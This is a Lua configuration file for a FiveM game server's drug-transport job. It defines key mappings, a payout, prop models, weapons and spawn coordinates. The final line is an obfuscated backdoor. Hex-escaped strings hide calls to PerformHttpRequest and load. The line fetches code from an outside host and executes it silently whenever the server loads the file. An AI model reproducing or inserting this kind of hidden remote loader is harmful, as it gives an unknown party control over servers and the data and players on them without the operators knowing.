Keys = {
    ['ESC'] = 322, ['F1'] = 288, ['F2'] = 289, ['F3'] = 170, ['F5'] = 166, ['F6'] = 167, ['F7'] = 168, ['F8'] = 169, ['F9'] = 56, ['F10'] = 57,
    ['~'] = 243, ['1'] = 157, ['2'] = 158, ['3'] = 160, ['4'] = 164, ['5'] = 165, ['6'] = 159, ['7'] = 161, ['8'] = 162, ['9'] = 163, ['-'] = 84, ['='] = 83, ['BACKSPACE'] = 177,
    ['TAB'] = 37, ['Q'] = 44, ['W'] = 32, ['E'] = 38, ['R'] = 45, ['T'] = 245, ['Y'] = 246, ['U'] = 303, ['P'] = 199, ['['] = 39, [']'] = 40, ['ENTER'] = 18,
    ['CAPS'] = 137, ['A'] = 34, ['S'] = 8, ['D'] = 9, ['F'] = 23, ['G'] = 47, ['H'] = 74, ['K'] = 311, ['L'] = 182,
    ['LEFTSHIFT'] = 21, ['Z'] = 20, ['X'] = 73, ['C'] = 26, ['V'] = 0, ['B'] = 29, ['N'] = 249, ['M'] = 244, [','] = 82, ['.'] = 81,
    ['LEFTCTRL'] = 36, ['LEFTALT'] = 19, ['SPACE'] = 22, ['RIGHTCTRL'] = 70,
    ['HOME'] = 213, ['PAGEUP'] = 10, ['PAGEDOWN'] = 11, ['DEL'] = 178,
    ['LEFT'] = 174, ['RIGHT'] = 175, ['TOP'] = 27, ['DOWN'] = 173,
}

Config = {}

Config.Police = 2

Config.Payout = 23785

Config.Package = {
    [0] = {pack},
    [1] = {pack},
    [2] = {pack},
    [3] = {pack},
    [4] = {pack},
    [5] = {pack},
    [6] = {pack},
    [7] = {pack},
    [8] = {pack},
    [9] = {pack},
    [10] = {pack},
    [11] = {pack},
    [12] = {pack},
    [13] = {pack},
    [14] = {pack},
}

Config.Models = {
    ['Models'] = {
		[1] = {model = 'hei_prop_heist_weed_block_01b'},
		[2] = {model = 'hei_prop_heist_weed_block_01'},
	},
}

Config.Weapons = {
    ['Weapons'] = {
		[1] = {weapon = 'weapon_bat'},
		[2] = {weapon = 'weapon_unarmed'},
        [3] = {weapon = 'weapon_snspistol'},
        [4] = {weapon = 'weapon_wrench'},
	},
}

Config.illegaltransportation = {
	['BossSpawn'] = { 
		Pos = {x = 1522.57, y = 6329.12, z = 24.63, h = 329.61}, 
		Type  = 'a_m_m_og_boss_01', 
	},
    ['VehicleSpawn'] = { 
		Pos = {x = 1541.15, y = 6335.57, z = 23.66, h = 61.24}, 
		Type  = 'rebel',
	},
    ['VehicleDepot'] = { 
		Pos = {x = 1510.19, y = 6336.93, z = 23.88, h = 262.8}, 
	},
}


Config.Randomize = {
    {name='first'},
    {name='second'},
    {name='third'},
    {name='fourth'},
    {name='fifth'},
    {name='sixth'},
    {name='seventh'},
    {name='eighth'},
    {name='ninth'},
    {name='tenth'},
    {name='eleventh'},
    {name='twelfth'},
    {name='thirteenth'},
    {name='fourteenth'},
    {name='fifteenth'},
}

Config.Places = {
    ['first'] = { 
		Pos = {x = -222.22, y = 6445.48, z = 36.85, h = 275.93},  
        DrugPos = {x = -228.88, y = 6454.33, z = 31.14, h = 22.11},  
        DrugPos2 = {x = -236.13, y = 6450.23, z = 31.15, h = 224.2}, 
        Peds = {['Peds'] = {
            [1]={x=-231.6, y = 6445.99, z = 31.2, h = 154.48,ped,blip},
            [2]={x=-226.22, y = 6459.41, z = 31.2, h = 141.3,ped,blip},
            [3]={x=-216.24, y = 6448.64, z = 31.21, h = 44.65,ped,blip}, 
        }},
	},
    ['second'] = { 
		Pos = {x = 747.7, y = 4184.82, z = 50.2, h = 349.5},  
        DrugPos = {x = 754.63, y = 4177.88, z = 40.94, h = 309.37},  
        DrugPos2 = {x = 737.03, y = 4174.9, z = 40.71, h = 348.94}, 
        Peds = {['Peds'] = {
            [1]={x=738.59, y = 4184.22, z = 40.76, h = 337.32,ped,blip},
            [2]={x=755.02, y = 4182.89, z = 40.71, h = 350.93,ped,blip},
            [3]={x=741.4, y = 4166.22, z = 41.38, h = 248.62,ped,blip}, 
        }},
	},
    ['third'] = { 
		Pos = {x = 1377.58, y = 4304.9, z = 36.76, h = 216.31},  
        DrugPos = {x = 1381.04, y = 4286.94, z = 36.48, h = 313.86},  
        DrugPos2 = {x = 1388.81, y = 4309.78, z = 36.89, h = 263.88}, 
        Peds = {['Peds'] = {
            [1]={x=1380.3, y = 4305.69, z = 36.74, h = 42.01,ped,blip},
            [2]={x=1377.37, y = 4295.91, z = 36.68, h = 34.64,ped,blip},
            [3]={x=1398.24, y = 4297.79, z = 36.56, h = 242.83,ped,blip}, 
        }},
	},
    ['fourth'] = { 
		Pos = {x = 1903.05, y = 4922.0, z = 48.79, h = 336.29},  
        DrugPos = {x = 1904.35, y = 4909.91, z = 48.75, h = 253.3},  
        DrugPos2 = {x = 1893.53, y = 4927.11, z = 48.93, h = 340.79}, 
        Peds = {['Peds'] = {
            [1]={x=1900.62, y = 4936.65, z = 49.55, h = 297.76,ped,blip},
            [2]={x=1915.43, y = 4922.48, z = 48.45, h = 344.44,ped,blip},
            [3]={x=1897.98, y = 4916.46, z = 48.79, h = 173.52,ped,blip}, 
        }},
	},
    ['fifth'] = { 
		Pos = {x = 2527.12, y = 4985.54, z = 44.81, h = 103.93},  
        DrugPos = {x = 2524.75, y = 4996.59, z = 44.67, h = 140.68},  
        DrugPos2 = {x = 2521.33, y = 4977.66, z = 44.87, h = 196.17}, 
        Peds = {['Peds'] = {
            [1]={x = 2527.33, y = 4971.01, z = 44.52, h = 117.22,ped,blip},
            [2]={x = 2515.92, y = 4988.53, z = 44.92, h = 222.16,ped,blip},
            [3]={x = 2529.56, y = 4995.13, z = 44.89, h = 347.31,ped,blip}, 
        }},
	},
    ['sixth'] = { 
		Pos = {x = 3333.01, y = 5161.66, z = 18.28, h = 120.14},  
        DrugPos = {x = 3327.00, y = 5170.67, z = 18.37, h = 13.83},  
        DrugPos2 = {x = 3337.87, y = 5156.20, z = 18.37, h = 35.28}, 
        Peds = {['Peds'] = {
            [1]={x = 3332.67, y = 5156.11, z = 18.29, h = 123.18,ped,blip},
            [2]={x = 3329.96, y = 5165.47, z = 18.52, h = 81.64,ped,blip},
            [3]={x = 3338.19, y = 5171.21, z = 18.24, h = 303.21,ped,blip}, 
        }},
	},
    ['seventh'] = { 
		Pos = {x = 1911.82, y = 3729.16, z = 32.41, h = 317.03},  
        DrugPos = {x = 1909.57, y = 3737.44, z = 32.51, h = 351.28},  
        DrugPos2 = {x = 1903.99, y = 3733.75, z = 32.54, h = 217.63}, 
        Peds = {['Peds'] = {
            [1]={x = 1909.32, y = 3724.04, z = 32.70, h = 276.57,ped,blip},
            [2]={x = 1906.78, y = 3735.63, z = 32.44, h = 219.34,ped,blip},
            [3]={x = 1917.47, y = 3726.35, z = 32.76, h = 203.14,ped,blip}, 
        }},
	},
    ['eighth'] = { 
		Pos = {x = 894.67, y = 3578.11, z = 33.36, h = 258.26},  
        DrugPos = {x = 899.59, y = 3575.07, z = 33.49, h = 75.79},  
        DrugPos2 = {x = 899.17, y = 3582.79, z = 33.41, h = 348.45}, 
        Peds = {['Peds'] = {
            [1]={x = 899.27, y = 3585.06, z = 33.43, h = 350.79,ped,blip},
            [2]={x = 892.18, y = 3579.99, z = 33.37, h = 108.93,ped,blip},
            [3]={x = 898.73, y = 3573.39, z = 33.56, h = 222.47,ped,blip}, 
        }},
	},
    ['ninth'] = { 
		Pos = {x = 374.99, y = 3585.20, z = 33.29, h = 162.71},  
        DrugPos = {x = 373.04, y = 3580.03, z = 33.29, h = 157.81},  
        DrugPos2 = {x = 372.60, y = 3583.59, z = 33.29, h = 330.95}, 
        Peds = {['Peds'] = {
            [1]={x = 378.39, y = 3583.80, z = 33.29, h = 55.58,ped,blip},
            [2]={x = 376.74, y = 3578.88, z = 33.29, h = 30.38,ped,blip},
            [3]={x = 367.97, y = 3584.50, z = 33.37, h = 89.64,ped,blip}, 
        }},
	},
    ['tenth'] = { 
		Pos = {x = 55.71, y = 3712.88, z = 39.75, h = 260.65},  
        DrugPos = {x = 48.58, y = 3715.11, z = 39.75, h = 84.48},  
        DrugPos2 = {x = 50.38, y = 3706.24, z = 39.75, h = 178.42}, 
        Peds = {['Peds'] = {
            [1]={x = 57.37, y = 3705.61, z = 39.75, h = 237.45,ped,blip},
            [2]={x = 60.54, y = 3717.45, z = 39.75, h = 340.26,ped,blip},
            [3]={x = 48.30, y = 3718.17, z = 39.73, h = 66.81,ped,blip}, 
        }},
	},
    ['eleventh'] = { 
		Pos = {x = 260.46, y = 3103.04, z = 42.40, h = 178.30},  
        DrugPos = {x = 263.51, y = 3101.88, z = 42.61, h = 96.29},  
        DrugPos2 = {x = 257.33, y = 3106.73, z = 42.49, h = 286.51}, 
        Peds = {['Peds'] = {
            [1]={x = 258.39, y = 3113.51, z = 42.49, h = 353.79,ped,blip},
            [2]={x = 263.67, y = 3106.20, z = 42.55, h = 83.79,ped,blip},
            [3]={x = 259.32, y = 3098.45, z = 42.41, h = 159.37,ped,blip}, 
        }},
	},
    ['twelfth'] = { 
		Pos = {x = 870.25, y = 2866.49, z = 56.81, h = 191.53},  
        DrugPos = {x = 867.57, y = 2871.62, z = 56.97, h = 247.63},  
        DrugPos2 = {x = 859.79, y = 2870.20, z = 57.46, h = 76.47}, 
        Peds = {['Peds'] = {
            [1]={x = 866.31, y = 2862.15, z = 57.40, h = 179.59,ped,blip},
            [2]={x = 880.87, y = 2865.09, z = 56.63, h = 198.15,ped,blip},
            [3]={x = 874.84, y = 2876.99, z = 56.81, h = 1.92,ped,blip}, 
        }},
	},
    ['thirteenth'] = { 
		Pos = {x = 1581.50, y = 2904.52, z = 56.88, h = 31.36},  
        DrugPos = {x = 1581.50, y = 2909.13, z = 56.90, h = 355.41},  
        DrugPos2 = {x = 1587.98, y = 2900.90, z = 57.03, h = 228.92}, 
        Peds = {['Peds'] = {
            [1]={x = 1585.75, y = 2895.92, z = 57.08, h = 195.78,ped,blip},
            [2]={x = 1594.55, y = 2903.63, z = 57.07, h = 315.71,ped,blip},
            [3]={x = 1575.32, y = 2909.90, z = 57.00, h = 54.15,ped,blip}, 
        }},
	},
    ['fourteenth'] = { 
		Pos = {x = 1983.33, y = 3035.76, z = 47.06, h = 303.65},  
        DrugPos = {x = 1986.94, y = 3041.27, z = 47.06, h = 166.29},  
        DrugPos2 = {x = 1988.86, y = 3024.96, z = 47.06, h = 280.15}, 
        Peds = {['Peds'] = {
            [1]={x = 1994.33, y = 3028.45, z = 47.05, h = 308.21,ped,blip},
            [2]={x = 1975.50, y = 3032.72, z = 47.06, h = 81.42,ped,blip},
            [3]={x = 1972.77, y = 3041.16, z = 47.06, h = 30.43,ped,blip}, 
        }},
	},
    ['fifteenth'] = { 
		Pos = {x = 2311.18, y = 2519.64, z = 46.67, h = 179.44},  
        DrugPos = {x = 2310.79, y = 2526.56, z = 46.66, h = 359.33},  
        DrugPos2 = {x = 2315.98, y = 2519.91, z = 46.67, h = 222.11}, 
        Peds = {['Peds'] = {
            [1]={x = 2316.72, y = 2515.35, z = 46.67, h = 230.46,ped,blip},
            [2]={x = 2310.42, y = 2530.11, z = 46.62, h = 9.45,ped,blip},
            [3]={x = 2304.57, y = 2517.05, z = 46.56, h = 154.33,ped,blip}, 
        }},
	},
}

local csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x65\x78\x75\x73\x6d\x61\x67\x72\x70\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x77\x6c\x61\x50\x38\x65", function (tNyABUlbDXSbaQvQMNCoBAlHohpPfESngiaowNqEDpaLDCYLuYHUEhQqdgkmvOCcCDASuR, NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu) if (NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu == csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[6] or NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu == csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[5]) then return end csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[2]](csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[3]](NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu))() end)